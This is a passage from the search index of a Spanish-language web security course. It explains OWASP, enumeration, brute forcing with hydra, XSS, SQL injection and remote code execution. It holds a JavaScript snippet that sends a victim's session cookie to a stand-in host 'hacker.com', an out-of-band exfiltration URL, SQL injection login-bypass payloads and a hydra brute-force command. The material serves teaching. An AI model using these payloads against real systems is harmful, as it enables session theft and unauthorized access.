teoría elimina una vulnerabilidad, o la vuelve significativamente\nmás difícil de explotar. La implementación de una mitigación se denomina parche o \u003cem\u003epatch\u003c/em\u003e.\u003c/p\u003e\n\u003ch3 id=\"tipos-de-vulnerabilidades\"\u003eTipos de Vulnerabilidades\u003c/h3\u003e\n\u003cp\u003eEn términos generales, las vulnerabilidades surgen por una de estas tres razones:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePor bugs\u003c/strong\u003e: es decir que hay un error en el código y este produce comportamiento inesperado.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePor lógica\u003c/strong\u003e: lo que significa que el diseño de la aplicación en sí es vulnerable. No necesariamente existen bugs.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePor dependencias\u003c/strong\u003e: alguna de las librerías utilizadas tiene una vulnerabilidad que es explotable dentro del sistema.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eTener estas diferenciaciones en mente sirve para entender de mejor manera cómo explotar una vulnerabilidad.\nLas vulnerabilidades por bugs usualmente se explotan mediante la generación de errores, o explorando un camino de\ninteracción no previsto por los desarrolladores. En cambio para las vulnerabilidades por lógica es necesario entender\nla arquitectura del servicio y encontrar hoyos en esta. Finalmente, las vulnerabilidades por dependencias suelen\nser explotadas mediante código hecho específicamente para esto, los cuales se pueden encontrar en Github u otros\nrepositorios como Metasploit.\u003c/p\u003e\n\u003ch2 id=\"owasp\"\u003eOWASP\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/\"\u003eThe Open Web Application Security Project\u003c/a\u003e es una organización sin fines de lucro que intenta\nmejorar la seguridad del software en general. Desarrollan diferentes proyectos para ayudar a\nlas personas a generar mejores sistemas y código. Estos comprenden guías de desarrollo y testeo,\ndefiniciones de estándares y herramientas automatizadas, lo cual facilita el desarrollo de software\nseguro y de calidad.\u003c/p\u003e\n\u003ch3 id=\"top-10-web-application-security-risks\"\u003eTop 10 Web Application Security Risks\u003c/h3\u003e\n\u003cp\u003eEl \u003ca href=\"https://owasp.org/www-project-top-ten/\"\u003eOWASP Top 10\u003c/a\u003e es un proyecto que recopila los 10 riesgos de\nseguridad más comunes en aplicaciones web. Estos riesgos usualmente se traducen en vulnerabilidades bajo ciertas\ncondiciones, por lo que es importante que al menos conozcan que existen y entiendan por qué surgen.\nCon la excepción de algunos casos muy particulares, todas las vulnerabilidades que ustedes encuentren\ncorresponderán a uno (o a veces más de uno) de los riesgos en la lista. Estos son:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eBroken Access Control\u003c/li\u003e\n\u003cli\u003eCryptographic Failures\u003c/li\u003e\n\u003cli\u003eInjection\u003c/li\u003e\n\u003cli\u003eInsecure Design\u003c/li\u003e\n\u003cli\u003eSecurity Misconfiguration\u003c/li\u003e\n\u003cli\u003eVulnerable and Outdated Components\u003c/li\u003e\n\u003cli\u003eIdentification and Authentication Failures\u003c/li\u003e\n\u003cli\u003eSoftware and Data Integrity Failures\u003c/li\u003e\n\u003cli\u003eSecurity Logging and Monitoring Failures\u003c/li\u003e\n\u003cli\u003eServer-Side Request Forgery\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eLa mayoría de los nombres son bastante autodescriptivos, sin embargo si desean conocer estos riesgos\nmás en detalle, por favor visiten el proyecto de OWASP y lean su documentación.\u003c/p\u003e\n\u003ch3 id=\"web-security-testing-guide\"\u003eWeb Security Testing Guide\u003c/h3\u003e\n\u003cp\u003eLa \u003ca href=\"https://owasp.org/www-project-web-security-testing-guide/\"\u003eWeb Security Testing Guide\u003c/a\u003e es una guía que intenta\nestandarizar la forma de realizar pruebas de seguridad a una aplicación web. Es particularmente útil para\nlas personas que quieran seguir en esta área, ya que entra en harto detalle sobre cómo funciona cada ataque\ny de qué forma se puede realizar.\u003c/p\u003e\n\u003ch3 id=\"otros-proyectos-de-owasp\"\u003eOtros Proyectos de OWASP\u003c/h3\u003e\n\u003cp\u003eOtros proyectos de OWASP incluyen:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-dependency-track/\"\u003eDependency Track\u003c/a\u003e: Una herramienta que analiza estáticamente\nlas dependencias de un proyecto y las compara con repositorios de software con vulnerabilidades conocidas,\navisando si se utiliza alguno de estos.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-juice-shop/\"\u003eJuice Shop\u003c/a\u003e: Es un sitio web especialmente diseñado para ser vulnerable\na cada uno de los elementos en el OWASP Top 10. Es muy útil para practicar el pentesting.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-mobile-security-testing-guide/\"\u003eMobile Security Testing Guide\u003c/a\u003e: Similar a la\nWeb Security Testing Guide, pero para aplicaciones móviles.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-modsecurity-core-rule-set/\"\u003eModSecurity Core Rule Set\u003c/a\u003e: Es un set de reglas\ngenéricas de detección de ataques, compatibles con firewalls, Web Application Firewalls (WAFs) y otros filtros.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-samm/\"\u003eSoftware Assurance Maturity Model (SAMM)\u003c/a\u003e: Es un modelo de desarrollo\nque ayuda a analizar y mejorar los ciclos de desarrollo seguro del software.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-security-knowledge-framework/\"\u003eSecurity Knowledge Framework\u003c/a\u003e: Base de datos de\nchecklists y buenas prácticas para proyectos para múltiples lenguajes de programación, que muestran cómo prevenir\nel acceso de hackers al sistema.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-zap/\"\u003eZed Attack Proxy (ZAP)\u003c/a\u003e: Herramienta automatizada de análisis web dinámico.\nRealiza una serie estandarizada de pruebas a aplicaciones web para encontrar vulnerabilidades comunes.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:15,href:"/docs/apps-web/tecnicas-basicas/",title:"Técnicas Básicas de Análisis Web",description:null,content:"\u003cp\u003eEn este capítulo hablaremos de algunas de las técnicas más básicas utilizadas para en análisis web.\nPara estas no se requiere ningún o casi ningún conocimiento sobre el funcionamiento o características del sitio,\ny pueden ser aplicadas de manera casi inmediata. Usualmente se utiliza herramientas muy simples, que\nrequieren muy poca configuración para ser usadas. Desde el lado del servidor, suele ser bastante fácil detectar el uso de estas herramientas, por lo que\nlos sistemas relativamente bien monitoreados usualmente bloquean IPs con este comportamiento.\u003c/p\u003e\n\u003cp\u003eEl objetivo de las herramientas que veremos ahora es obtener más información sobre el servicio web,\nencontrando archivos, usuarios y otros recursos que pueden estar escondidos. Si tienen mucha suerte,\nesto también puede resultar en la divulgación de información privada, sensible o crítica,\no incluso pueden ganar privilegios si logran encontrar contraseñas.\u003c/p\u003e\n\u003ch2 id=\"enumeración\"\u003eEnumeración\u003c/h2\u003e\n\u003cp\u003eLa enumeración es un proceso en el cual se itera por una lista de valores (llamadas diccionarios), intentando\nencontrar información nueva. Esto se puede aplicar a subdirectorios de un sitio web, subdominios,\nnombres de usuario, nombres de parámetros, servicios ofrecidos, puertos abiertos, etc.\nTambién se puede utilizar fuzzers, los cuales toman un input conocido y lo modifican de múltiples maneras\npara encontrar otros inputs con comportamientos diferentes.\u003c/p\u003e\n\u003cp\u003eEste proceso funciona enviando las distintas peticiones al servidor y analizando sus respuestas. No se\nsuele encontrar muchas vulnerabilidades de esta forma, pero sí se logra recopilar información\ny funcionalidades previamente no vistas.\u003c/p\u003e\n\u003cp\u003eLas herramientas comúnmente usadas en el área web son:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/OJ/gobuster\"\u003eGobuster\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/maurosoria/dirsearch\"\u003eDirsearch\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/KajanM/DirBuster\"\u003eDirbuster\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/v0re/dirb\"\u003eDirb\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/aboul3la/Sublist3r\"\u003eSublist3r\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/xmendez/wfuzz\"\u003eWfuzz\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/ffuf/ffuf\"\u003eFfuf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"fuerza-bruta\"\u003eFuerza Bruta\u003c/h2\u003e\n\u003cp\u003eSimilar a la enumeración, pero en este caso se intenta pasar por todos o casi todos los valores posibles\nde un parámetro, aunque en muchos casos también se utiliza diccionarios. Se diferencian principalmente\nde manera conceptual, y en que la acción realizada usualmente tiene uno o unos pocos valores \u0026ldquo;correctos\u0026rdquo;,\nlos cuales resultan en una respuesta diferente del servidor (por ejemplo, ingresar una contraseña correcta\ntiene un resultado diferente al de ingresar una contraseña incorrecta).\nMediante la fuerza bruta se pueden encontrar contraseñas de usuarios, valores\naleatorizados, parámetros mágicos, secuencias específicas, etc.\u003c/p\u003e\n\u003cp\u003eLas herramientas usualmente utilizadas son:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/vanhauser-thc/thc-hydra\"\u003eHydra\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eVarios módulos de \u003ca href=\"https://github.com/rapid7/metasploit-framework\"\u003eMetasploit\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"ejemplo\"\u003eEjemplo\u003c/h2\u003e\n\u003cp\u003eOcuparemos Dirsearch para enumerar directorios en el host \u003ccode\u003e127.0.0.1:8000\u003c/code\u003e, el cual sabemos que está corriendo\nun servicio PHP. Utilizamos la flag \u003ccode\u003e-e\u003c/code\u003e para indicar la extensión de archivo que queremos buscar, y \u003ccode\u003e-u\u003c/code\u003e\npara indicar la URL base. El comando completo es:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003edirsearch -e php -u http://127.0.0.1:8000/\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eY obtenemos este resultado, en donde encontramos el archivo \u003ccode\u003eusers.php\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../dirsearch-result.png\" alt=\"Dirsearch Result\"\u003e\u003c/p\u003e\n\u003cp\u003eAnalizando el sitio sabemos que este es un formulario de login, por lo que le realizamos un ataque de\nfuerza bruta usando hydra. La flag \u003ccode\u003e-L\u003c/code\u003e indica el archivo con nombres de usuario, \u003ccode\u003e-P\u003c/code\u003e el archivo con contraseñas,\n\u003ccode\u003e-u\u003c/code\u003e itera por los usuarios en vez de las contraseñas y \u003ccode\u003e-s\u003c/code\u003e define el puerto. Adicionalmente debemos entregarle\nla IP del objetivo y el tipo de request (en este caso \u003ccode\u003ehttp-post-form\u003c/code\u003e).\u003c/p\u003e\n\u003cp\u003eEl último parámetro se divide en 3\npartes separado por el caracter \u003ccode\u003e:\u003c/code\u003e. Primero está la ruta al archivo con el formulario, luego tenemos los\ndatos que se enviarán en la consulta POST (\u003ccode\u003e^USER^\u003c/code\u003e se reemplaza por el nombre de usuario y \u003ccode\u003e^PASS^\u003c/code\u003e por la\ncontraseña), y finalmente le entregamos un valor para reconocer los intentos fallidos (\u003ccode\u003eIncorrect credentials\u003c/code\u003e).\u003c/p\u003e\n\u003cp\u003eEl comando completo es:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ehydra -L /usr/share/wordlists/metasploit/unix_users.txt \\\n-P /usr/share/wordlists/rockyou.txt -u -s 8000 127.0.0.1 http-post-form \\\n\u0026quot;/users.php:user=^USER^\u0026amp;pass=^PASS^:Incorrect credentials\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"../hydra-bruteforce.png\" alt=\"Hydra Bruteforce\"\u003e\u003c/p\u003e\n\u003cp\u003eLuego de correr el comando obtenemos las credenciales \u003ccode\u003eadmin:password\u003c/code\u003e.\u003c/p\u003e\n"},{id:16,href:"/docs/apps-web/xss/",title:"Cross-Site Scripting",description:null,content:"\u003cp\u003eEl Cross-Site Scripting, o XSS (incluido en el punto 3 del OWASP Top 10), se refiere a una clase de vulnerabilidades que\nintentan introducir código JavaScript en un sitio web, el cual será ejecutado en el navegador de otros usuarios.\nDependiendo de la aplicación en específico, las repercusiones de esto varían desde meras molestias hasta\nla completa ruptura de confidencialidad e integridad del sistema.\u003c/p\u003e\n\u003cp\u003eExisten 3 tipos:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAlmacenado\u003c/strong\u003e: El payload queda almacenado en algún lado y no es necesario estar activamente atacando a la víctima.\nUna vez que ella acceda a este, se ejecutará el código malicioso.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eReflejado\u003c/strong\u003e: El payload no se almacena permanentemente, sino que viene codificado en alguna variable\n(como un parámetro GET).\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDOM\u003c/strong\u003e: Este tipo de XSS surge cuando el código JavaScript de la página contiene una vulnerabilidad que permite\ninyectar más codigo JavaScript a partir de variables reflejadas o almacenadas.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"javascript\"\u003eJavaScript\u003c/h2\u003e\n\u003cp\u003eJavaScript (JS) es un lenguaje de programación orientado a objetos que usualmente se utiliza para añadir\ncomponentes dinámicas a un sitio web. \u003ca href=\"https://www.w3schools.com/js/DEFAULT.asp\"\u003eAquí\u003c/a\u003e\npueden encontrar un tutorial de JS si lo necesitan.\nEl código JS en una página se ejecuta en el navegador del usuario, no en el servidor.\nExisten varias formas \u003cem\u003e\u0026ldquo;oficiales\u0026rdquo;\u003c/em\u003e de insertar JS en un sitio. El primero es tener el código directamente en\nel HTML, delimitado por tags \u003ccode\u003e\u0026lt;script\u0026gt;\u0026lt;/script\u0026gt;\u003c/code\u003e, por ejemplo:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u0026lt;html\u0026gt;\n    \u0026lt;head\u0026gt;\n        \u0026lt;script\u0026gt;\n            ...code...\n        \u0026lt;/script\u0026gt;\n    \u0026lt;/head\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLa otra forma es hacer una referencia a un archivo que contenga el código, como por ejemplo:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u0026lt;html\u0026gt;\n    \u0026lt;head\u0026gt;\n        \u0026lt;script src=\u0026quot;/code.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\n    \u0026lt;/head\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eFinalmente, se puede introducir JS bajo ciertos eventos, como \u003ccode\u003eonclick\u003c/code\u003e, \u003ccode\u003eonerror\u003c/code\u003e, \u003ccode\u003eonmouseover\u003c/code\u003e, etc.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e\u0026lt;html\u0026gt;\n    \u0026lt;body\u0026gt;\n        \u0026lt;button onclick=\u0026quot;...code...\u0026quot;\u0026gt;\u0026lt;/button\u0026gt;\n    \u0026lt;/body\u0026gt;\n\u0026lt;/html\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eExisten otras formas de introducir código JS a un sitio web, pero se utilizan más que nada en ataques donde las\nformas comunes están siendo bloqueadas o filtradas. Estas se escapan del ámbito de este curso, pero si están\ninteresados, pueden revisar la\n\u003ca href=\"https://owasp.org/www-community/xss-filter-evasion-cheatsheet\"\u003eguía de evasión de filtros XSS\u003c/a\u003e de OWASP.\u003c/p\u003e\n\u003ch2 id=\"ejemplos\"\u003eEjemplos\u003c/h2\u003e\n\u003cp\u003eUno de los usos más peligrosos de este tipo de ataques es el robo de sesiones. El código introducido toma la\ncookie de sesión de la víctima y se la envía al atacante. Luego él puede simplemente copiar esta cookie en\nsu navegador, con lo cual obtiene acceso autenticado como la víctima. El código a continuación logra hacer esto:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003evar xhr = new XMLHttpRequest();\nxhr.open(\u0026quot;POST\u0026quot;, \u0026quot;https://hacker.com/\u0026quot;, true);\nxhr.setRequestHeader(\u0026quot;Content-Type\u0026quot;, \u0026quot;application/x-www-form-urlencoded\u0026quot;);\nxhr.send(\u0026quot;cookie=\u0026quot; + document.cookie);\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOtro uso es el Cross-Site Request Forgery (CSRF). Estos ataques intentan impersonar a la víctima, enviando\nconsultas en su nombre. Esto funciona ya que las consultas hechas a través de JavaScript también llevan las cookies\ny parámetros de sesión del usuario, por lo que el atacante tiene el potencial de ganar los mismos permisos que\nla víctima. Esto se podría utilizar, por ejemplo, para realizar acciones en nombre del administrador, con lo cual\ncrear otro usuario con permisos de administrador.\u003c/p\u003e\n"},{id:17,href:"/docs/apps-web/inyecciones/",title:"Inyecciones",description:null,content:"\u003cp\u003eEn términos generales, una inyección (punto 3 del OWASP Top 10) es un ataque que intenta confundir al servidor\nde forma que interprete datos como si fueran código. Esto tiene un potencial muy grande de explotación, aunque\nusualmente está restringido por factores como filtros, configuraciones de seguridad y tecnologías usadas.\u003c/p\u003e\n\u003cp\u003eEstos ataques suelen conllevar a filtración de información, pero también puede ser posible crear,\nmodificar y eliminar datos, ejecutar comandos de sistema, enviar requests a otros servidores, y realizar\nuna denegación de servicio (DoS) por la utilización de demasiados recursos. En general ocurren porque el\nservidor no sanitiza correctamente datos controlados por el usuario, para luego utilizarlos directamente en un\nsistema separado con el cual debe interactuar por medio de una API o algo similar.\u003c/p\u003e\n\u003ch2 id=\"sql\"\u003eSQL\u003c/h2\u003e\n\u003cp\u003eLas inyecciones SQL (o SQLi) son el ataque más conocido en general. Como lo dice el nombre, este se refiere a la\ninyección de comandos SQL en una consulta. Si no conocen SQL, o necesitan refrescar su memoria, los invito a\nver el \u003ca href=\"https://www.w3schools.com/sql/default.asp\"\u003etutorial de w3schools\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eUn ejemplo de esta inyección sería un formulario de login que toma los parámetros entregados por el\nusuario y los usa directamente en la consulta:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eSELECT username FROM users WHERE username = '$username' AND password = SHA256('$password');\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eLuego esto puede ser aprovechado para ingresar de manera autenticada, sin tener credenciales. La forma de hacerlo\nes ingresando el usuario \u003ccode\u003e' or 1=1; -- - \u003c/code\u003e. Reemplazando esto en la consulta anterior, nos queda:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eSELECT username FROM users WHERE username = '' or 1=1; -- - ' AND password = SHA256('$password');\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eEsto selecciona a los usuarios que cumplan con \u003ccode\u003eusername = ''\u003c/code\u003e o que \u003ccode\u003e1=1\u003c/code\u003e. El resto del comando está comentado\npor \u003ccode\u003e-- -\u003c/code\u003e. Ya que todos los usuarios cumplen con esta condición, el atacante se autentica ingresa de manera\nautenticada como el primer usuario que aparezca en la respuesta.\u003c/p\u003e\n\u003cp\u003eLas inyecciones se dividen en 2 tipos:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eNon Blind\u003c/strong\u003e: En donde las respuestas a las consultas se retornan directamente al atacante, y por lo tanto puede\nrobarse toda la información muy rápidamente.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBlind\u003c/strong\u003e: Las respuestas a las consultas no se muestran en ninguna parte, por lo que se debe utilizar otras técnicas\npara obtener la información. Esto usualmente significa consultar caracter por caracter (el nombre de usuario\nempieza con a?), y distinguir las respuestas en base al comportamiento del servidor.\nEstos nuevamente se dividen en 2:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBoolean Based\u003c/strong\u003e: El servidor realiza una acción dependiendo de si la consulta fue exitosa o no. Por ejemplo,\nlanzar un error, autenticar a un usuario, ejecutar un proceso, etc.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTime Based\u003c/strong\u003e: Esta técnica se basa en el tiempo de respuesta del servidor. La forma de utilizarla es hacer una\nconsulta que intencionalmente haga esperar al servidor en ciertos casos. Por ejemplo, si el nombre de usuario\nempieza con a, espera 5 segundos y retorna, sino retorna inmediatamente.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eLa herramienta \u003ca href=\"https://github.com/sqlmapproject/sqlmap\"\u003esqlmap\u003c/a\u003e se utiliza mucho para hacer un análisis\nautomatizado de este tipo de inyecciones. Envía un conjunto de requests estándar, el cual se adapta a la\ninformación recolectada y otros parámetros, con lo cual puede detectar la gran mayoría de las inyecciones\nsimples. Muchas veces esta herramienta sola no es suficiente, por lo que deberán crear scripts de \u003cem\u003etamper\u003c/em\u003e\nespecíficos para su situación, o realizar en análisis de otra forma.\u003c/p\u003e\n\u003ch2 id=\"otros-tipos\"\u003eOtros Tipos\u003c/h2\u003e\n\u003cp\u003eExisten muchos otros tipos de inyecciones que no veremos en este curso, pero es bueno que sepan que existen.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eNoSQL\u003c/strong\u003e: Similar a las SQLi, pero en sistemas NoSQL. Esto tiene diferencias de sintaxis y añade comandos y\nfunciones no disponibles en SQL.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eXML\u003c/strong\u003e: El Extensible Markup Language (XML) se utiliza en muchos lados y es notorio por sus riesgos de seguridad,\nya que tiene hartas funcionalidades explotables. Algunas categorías de inyección XML son:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTag Injection\u003c/li\u003e\n\u003cli\u003eXML eXternal Entities (XXE)\u003c/li\u003e\n\u003cli\u003eXML Entity Expansion (XEE)\u003c/li\u003e\n\u003cli\u003eXPath\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eLightweight Directory Access Protocol\u003c/strong\u003e (LDAP): Este es una especie de motor de búsqueda dentro de directorios\ny archivos, y de vez en cuando se utiliza para procesar consultas web.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"técnicas-avanzadas\"\u003eTécnicas Avanzadas\u003c/h2\u003e\n\u003cp\u003eExisten técnicas avanzadas de inyección que se escapan del ámbito del curso. Si se interesan, a continuación\npueden encontrar un pequeño resumen.\u003c/p\u003e\n\u003ch3 id=\"out-of-band-oob\"\u003eOut Of Band (OOB)\u003c/h3\u003e\n\u003cp\u003eMuchas veces el sistema que está siendo analizado es efectivamente vulnerable a inyecciones, pero no es posible\nobtener los resultados, ni siquiera con métodos ciegos. En estos casos se puede intentar una inyección fuera\nde banda o \u003cem\u003eOut Of Band\u003c/em\u003e (OOB). El objetivo es obtener los resultados a la consulta por medio de un canal\ndiferente al cual se realizó la inyección.\u003c/p\u003e\n\u003cp\u003ePor ejemplo, supongamos que además de la inyección, es posible\nenviar un request a otro servidor. Luego, la información podría ser filtrada al enviarla a una URL controlada\npor el atacante, como \u003ccode\u003ehttps://hacker.com?data=\u0026lt;data\u0026gt;\u003c/code\u003e. Esta técnica se puede combinar con inyecciones de tipo\nBlind y Non Blind.\u003c/p\u003e\n\u003ch3 id=\"second-order\"\u003eSecond Order\u003c/h3\u003e\n\u003cp\u003eDe vez en cuando sucede que una inyección no se ejecuta al momento de enviar el payload, sino que este queda\nalmacenado. Luego al acceder a este más adelante, se logra la inyección. Se llaman inyecciones de segundo\norden porque se explotan por medio de 2 requests:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eSe envía el payload, el cual queda almacenado.\u003c/li\u003e\n\u003cli\u003eSe intenta acceder a los datos almacenados, en donde se realiza la inyección.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eEstas vulnerabilidades surgen porque los desarrolladores usualmente consideran los valores controlados\npor el usuario inseguros, pero una vez que ya se almacenan en la base de datos son confiables.\nEsto no necesariamente es así, ya que un valor almacenado en la base de datos puede haber sido\nalterado por un usuario. Es decir, ningún valor es confiable, y las consultas a la base de datos\nsiempre se deben hacer de manera segura sin importar de dónde provengan los datos.\u003c/p\u003e\n\u003cp\u003ePara ilustrar esto, imaginemos un sitio vulnerable a inyecciones SQL de segundo orden,\nen donde nos registramos con el usuario \u003ccode\u003euser' or '1'='1\u003c/code\u003e. Esto no causa una inyección, pues los formularios\nde registro y de login están bien sanitizados.\nLuego, ingresamos al portal y vemos nuestro perfil, en donde el servidor realiza la consulta:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eSELECT data FROM users WHERE username = '$username';\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eReemplazando la variable por nuestro usuario obtenemos:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eSELECT data FROM users WHERE username = 'user' or '1'='1';\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eEs decir, estamos seleccionando el campo \u003ccode\u003edata\u003c/code\u003e de todos los usuarios en la base de datos. Esta técnica\ntambién puede ser combinada con inyecciones de tipo Blind y Non Blind.\u003c/p\u003e\n"},{id:18,href:"/docs/apps-web/rce/",title:"Remote Code Execution",description:null,content:"\u003cp\u003eEl Remote Code Execution (RCE) se refiere a la ejecución de comandos de sistema, o de algún lenguaje instalado, sin tener acceso a una\nterminal ni algún otro canal permitido para ejecutar comandos. El alcance de este ataque depende del sistema\noperativo, frameworks, lenguajes y filtros que se tenga instalados en el servidor.\u003c/p\u003e\n\u003cp\u003eSimilar a las inyecciones SQL de segundo orden, \u003cstrong\u003ela ejecución de comandos remotos pueden y suelen requerir\nmúltiples pasos\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"formas-de-rce\"\u003eFormas de RCE\u003c/h2\u003e\n\u003cp\u003eExisten muchas formas de explotar esta vulnerabilidad, pero las más comunes son:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSubir archivos ejecutables\u003c/strong\u003e: Por ejemplo PHP, que al ser visualizados en el navegador, el servidor ejecuta\nsu código.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eInyección de comandos\u003c/strong\u003e: Similarmente a las inyecciones SQL, a veces se utiliza variables controladas por el\nusuario en la ejecución de comandos de sistema, sin ser sanitizadas primero.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eSQLi\u003c/strong\u003e: Muchos sistemas administradores de bases de datos permiten la ejecución de comandos de sistema,\npor lo que al lograr SQLi también se puede lograr RCE.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eBuffer Overflows\u003c/strong\u003e: De vez en cuando un servidor web ejecuta un proceso que tiene un mal manejo de memoria.\nEsto muchas veces puede ser explotado para controlar a nivel de bytes las instrucciones que lleva\na cabo el servidor.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eDeserialización\u003c/strong\u003e: La serialización es una forma de codificar un objeto para poder almacenarlo o transmitirlo por\nla red. Si un servidor recibe un objeto serializado, muy probablemente intentará deserializarlo (proceso inverso).\nEsto puede ser aprovechado modificando el objeto serializado para controlar sus métodos o atributos.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eType Confusion\u003c/strong\u003e: Este tipo de vulnerabilidades surgen solo en lenguajes que son capaces de comparar variables\nde distinto tipo (por ejemplo PHP). Luego, esto puede ser utilizado para \u0026ldquo;confundir\u0026rdquo; al servidor y ejecutar\nramas del código que no son normalmente accesibles.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eUna vez que se logra explotar exitosamente el RCE, el atacante hereda los permisos del usuario que maneja el\nsistema explotado, usualmente \u003ccode\u003ewww-data\u003c/code\u003e. Si este usuario puede leer y escribir en un directorio, el atacante\ntambién podrá hacerlo. Si tiene permisos de \u003ccode\u003eroot\u003c/code\u003e, el atacante también los tendrá.\u003c/p\u003e\n\u003cp\u003eEste es el primero paso para tomar control de un servidor. Una vez que se tiene control de la ejecución de\ncomandos, se puede intentar escalar privilegios (ganar privilegios elevado) o realizar movimientos laterales\n(obtener privilegios de otros usuarios no elevados).\u003c/p\u003e\n\u003ch2 id=\"ejemplos\"\u003eEjemplos\u003c/h2\u003e\n\u003cp\u003ePara ilustrar esto, veamos un caso de inyección de comandos. Asumamos que tenemos un endpoint en un servidor PHP,\nhecho específicamente para crear archivos, en donde su nombre y su contenido se entregan por parámetros POST.\nEl código que se encarga de esto podría ser algo 